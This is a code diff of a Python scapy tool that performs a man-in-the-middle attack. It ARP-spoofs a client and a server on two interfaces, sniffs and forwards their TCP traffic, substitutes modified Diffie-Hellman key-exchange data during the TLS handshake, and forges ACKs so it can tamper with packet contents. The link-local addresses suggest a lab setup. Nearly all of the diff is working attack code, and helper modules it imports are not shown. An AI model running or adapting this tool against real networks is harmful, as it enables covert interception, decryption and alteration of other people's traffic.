@@ -3,75 +3,64 @@ from test import *
 from py_capture import Task
 import queue
 from multiprocessing import Process
+from arpspoof import ARPSpoof
 import multiprocessing as mp
 import subprocess
+import logging
+import os
 
-"""
-Forward TCP packet, and modify TLS packet.
+def arpspoof(interface, target, gateway):
+    Process(target = ARPSpoof(interface, target, gateway).run, daemon=True).start()
 
-if istcp:
-    forward()
-else:
-    parsetls()
-    if change_cipherspec() == DHE:
-        if from_src():
-            is_dhe = True
-            change_param_and_forward()
-            pre_master1, pre_master2 = get_two_param(param1, param2)
-            key1, key2 = derive_keys(pre_m1, pre_m2)
+def get_mac(ip, interface):
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
 
-    if tls_data && is_dhe:
-        if from_src():
-            plain_packet = derypt_use_masterkey1(packet)
-            enc_packet = encrypted_use_masterkey2(plain_packet)
-            forward2dst(enc_packet)
-        else:
-            ...
-            ...
-            ...
-
-    if nottls & from_source():
-        forward2dst() 
-    else:
-        forward2src() 
-"""
+def do_sniff(sender, brf, iface):
+    sniff(prn=sender, filter=brf, iface=iface)
 
 class MITM:
-    """
-    Config ip table to block the client => server, only allow client <-> server.
-    """
-    def __init__(self, local_ip, local_port, client_ip, server_ip, server_port):
+    def __init__(self, client_ip, server_ip, server_port):
         self.client_ip = client_ip
         self.server_ip = server_ip 
         self.server_port = server_port
-        self.local_ip = local_ip
-        self.local_port = local_port
         self.task = Task(PktHandler())
         self.tls_queue = mp.Queue()
         self.tcp_queue = mp.Queue()
+        self.client_mac = get_mac(self.client_ip, "eth0")
+        self.server_mac = get_mac(self.server_ip, "eth1")
+        self.eth0_mac = get_if_hwaddr("eth0")
+        self.eth1_mac = get_if_hwaddr("eth1")
 
-        # single client <=> server connection.
-        # why if condition: https://scapy.readthedocs.io/en/latest/troubleshooting.html
-        if self.server_ip == self.local_ip:
-            conf.L3socket = L3RawSocket 
-            load_layer("tls")
+        arpspoof("eth0", self.client_ip, self.server_ip)
+        arpspoof("eth1", self.server_ip, self.client_ip)
 
-        self.sock = conf.L3socket(iface="lo")
+        self.client_sock = conf.L2socket(iface="eth0")
+        self.server_sock = conf.L2socket(iface="eth1")
+        self.SOCK = {
+            self.client_ip: lambda data: self.client_sock.send(Ether(src = self.eth0_mac, dst=self.client_mac)/data),
+            self.server_ip: lambda data: self.server_sock.send(Ether(src = self.eth1_mac, dst=self.server_mac)/data),
+        }
 
     def run(self):
         cip = self.client_ip
         sip = self.server_ip
         sport = self.server_port
-        local_ip = self.local_ip
-        lport = self.local_port
-
-        brf = f"tcp and (dst port {lport} and dst net {local_ip})"
 
         # Enable worker, the packet must be executed in order.
         Process(target = self.tls_worker, daemon=True).start()
         Process(target = self.tcp_worker, daemon=True).start()
 
-        sniff(prn = self.sender, filter=brf, iface="lo")
+        # sniff on eth0 for intercepting client packets.
+        c_bpf = f"tcp and (dst port {sport} and dst net {sip})"
+        Process(target = do_sniff, daemon=True, args = (self.sender, c_bpf, "eth0",)).start()
+        # sniff on eth1 for intercepting server packets.
+        s_bpf = f"tcp and (src port {sport} and src net {sip})"
+        p = Process(target = do_sniff, daemon=True, args = (self.sender, s_bpf, "eth1",))
+        print("mitm started")
+        p.start()
+        p.join()
 
     def sender(self, pkt):
         ip = pkt.payload.payload
@@ -93,43 +82,26 @@ class MITM:
             self.parse(pkt)
 
     def forward(self, pkt):
-        if pkt.sport == self.server_port:
-            # from server => mitm => client
-            pkt.payload.dst = self.client_ip
-            pkt.payload.dport = self.cport
-            pkt.payload.src = self.local_ip
-            pkt.payload.sport = self.local_port
-            del pkt.payload.chksum
-            del pkt.payload.payload.chksum
-            data = IP(bytes(pkt.payload))
+        # recalculate headers checksum.
+        del pkt.payload.payload.chksum
+        del pkt.payload.chksum
+        del pkt.payload.len
+        data = IP(bytes(pkt.payload))
 
-            self.sock.send(data)
-        else:
-            # from client => mitm => server
-            # store client src & dst.
-            self.cport = pkt.payload.sport
-            self.client_ip = pkt.payload.src
-
-            # modify payload
-            pkt.payload.dst = self.server_ip
-            pkt.payload.dport = self.server_port
-            pkt.payload.src = self.local_ip 
-            pkt.payload.sport = self.local_port
-            # recalculate headers checksum.
-            del pkt.payload.payload.chksum
-            del pkt.payload.chksum
-
-            data = IP(bytes(pkt.payload))
-            self.sock.send(data)
+        # fake layer-3 IP, modify Ether layer in the lambda calculus.
+        self.SOCK[pkt.payload.dst](data)
         
     def parse(self, pkt):
         tcp_data = bytes(pkt.payload.payload)
         seq = self.task.get_seq()
+        logging.debug("current seq num is: " + str(seq))
 
-        tls_data = bytearray(bytes(pkt.payload.payload.payload))
-        (state, isdhe) = self.task.handler.handle_packet(tls_data, tcp_data, seq)
+        (state, isdhe) = self.task.handler.handle_packet(tcp_data)
 
-        if isdhe:
+        if state == TASKSTATE.BLOCK.value:
+            return
+
+        elif isdhe:
             """
             DHE: need to build connection between server & client.
             from server key exchange, we know the DHE-key-cipher, and send 
@@ -140,17 +112,35 @@ class MITM:
             """
             tls_data = self.task.handler.MODIFIED_TLS_DHE
             del pkt.payload.payload.payload
+            logging.debug("forwarded bytes: " + tls_data.hex() + " cur state: " + str(state))
             pkt = pkt / tls_data
+
+        if state == TASKSTATE.ClientKeyExchange.value:
+            self.task.increase()
+        elif state == TASKSTATE.NewSessionTicket.value:
+            self.task.increase()
         elif state == TASKSTATE.COMMUNICATION.value:
+            # send ack back to enable sizable packet content tamper.
+            ack = pkt.copy()
+            eth = ack 
+            ip = ack.payload
+
+            ack.src, ack.dst = eth.dst, eth.src
+            ack.payload.src, ack.payload.dst = ip.dst, ip.src
+            del ack.payload.payload
+
+            ack = ack / TCP(self.task.handler.MODIFIED_TCP)
+            self.tcp_queue.put(ack)
+            ack.show()
             self.task.increase()
         elif state == TASKSTATE.PASS.value:
             # already visited, retransmit; if no, the extended key derive will failed.
             self.tcp_queue.put(pkt)
             return
 
-        self.forward(pkt)
+        self.tcp_queue.put(pkt)
 
 if __name__ == "__main__":
-    mitm = MITM("127.0.0.1", 5000, "127.0.0.1", "127.0.0.1", 2333)
-    print("mitm start")
+    # client ip, server ip, server port.
+    mitm = MITM("169.254.127.207", "169.254.137.152", 2333)
     mitm.run()
